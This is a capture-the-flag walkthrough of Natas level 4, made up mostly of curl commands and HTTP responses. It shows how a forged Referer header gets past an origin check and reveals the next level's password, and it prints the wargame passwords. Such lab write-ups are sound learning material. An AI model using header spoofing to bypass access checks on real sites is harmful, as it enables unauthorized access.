### natas4 pswd: JDrPnuZAKyl6MkiqQGFIddrqpvgOASth

```bash
curl -v -s -c cookie.txt -X POST http://natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth@natas4.natas.labs.overthewire.org

# <div id="content">

# Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
# <br/>

```

Firefox
- first GET request \ edit
- add one more header
- Referer: http://natas5.natas.labs.overthewire.org/
- check response - Access granted. The password for natas5 is **e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M**
- right click response \ copy \ copy as cURL

```bash

curl 'http://natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth@natas4.natas.labs.overthewire.org/' \
  --compressed \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://natas5.natas.labs.overthewire.org/' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: _ga_RD0K2239G0=GS2.1.s1781869966$o6$g1$t1781871102$j55$l0$h0; _ga=GA1.1.1494425454.1780042556' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR' \
  -H 'Priority: u=0, i' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache'
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.# js"></script>
# <script>var wechallinfo = { "level": "natas4", "pass": "JDrPnuZAKyl6MkiqQGFIddrqpvgOASth" };</script></head>
# <body>
# <h1>natas4</h1>
# <div id="content">
# 
# Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
# <br/>
# <div id="viewsource"><a href="index.php">Refresh page</a></div>
# </div>
# </body>
# </html>
# 
```

or simply add -H referer to original curl command

```bash

curl -v -s -c cookie.txt  \
  -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/  \
  -X POST http://natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth@natas4.natas.labs.overthewire.org

# * Host natas4.natas.labs.overthewire.org:80 was resolved.
# * IPv6: (none)
# * IPv4: 13.53.215.123
# *   Trying 13.53.215.123:80...
# * Established connection to natas4.natas.labs.overthewire.org (13.53.215.123 port 80) from 10.0.2.15 port 45426 
# * using HTTP/1.x
# > POST / HTTP/1.1
# > Host: natas4.natas.labs.overthewire.org
# > User-Agent: curl/8.19.0
# > Accept: */*
# > Referer: http://natas5.natas.labs.overthewire.org/
# > 
# * Request completely sent off
# < HTTP/1.1 401 Unauthorized
# < Date: Fri, 19 Jun 2026 13:10:53 GMT
# < Server: Apache/2.4.58 (Ubuntu)
# < WWW-Authenticate: Basic realm="Authentication required"
# < Content-Length: 480
# < Content-Type: text/html; charset=iso-8859-1
# < 
# <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
# <html><head>
# <title>401 Unauthorized</title>
# </head><body>
# <h1>Unauthorized</h1>
# <p>This server could not verify that you
# are authorized to access the document
# requested.  Either you supplied the wrong
# credentials (e.g., bad password), or your
# browser doesn't understand how to supply
# the credentials required.</p>
# <hr>
# <address>Apache/2.4.58 (Ubuntu) Server at natas4.natas.labs.overthewire.org Port 80</address>
# </body></html>
# * Connection #0 to host natas4.natas.labs.overthewire.org:80 left intact
# * Reusing existing http: connection with host natas4.natas.labs.overthewire.org
# * Server auth using Basic with user 'natas4'
# > POST / HTTP/1.1
# > Host: natas4.natas.labs.overthewire.org
# > Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
# > User-Agent: curl/8.19.0
# > Accept: */*
# > Referer: http://natas5.natas.labs.overthewire.org/
# > 
# * Request completely sent off
# < HTTP/1.1 200 OK
# < Date: Fri, 19 Jun 2026 13:10:53 GMT
# < Server: Apache/2.4.58 (Ubuntu)
# < Vary: Accept-Encoding
# < Content-Length: 962
# < Content-Type: text/html; charset=UTF-8
# < 
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas4", "pass": "JDrPnuZAKyl6MkiqQGFIddrqpvgOASth" };</script></head>
# <body>
# <h1>natas4</h1>
# <div id="content">
# 
 Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
# <br/>
# <div id="viewsource"><a href="index.php">Refresh page</a></div>
# </div>
# </body>
# </html>
# * Connection #0 to host natas4.natas.labs.overthewire.org:80 left intact
# 
```
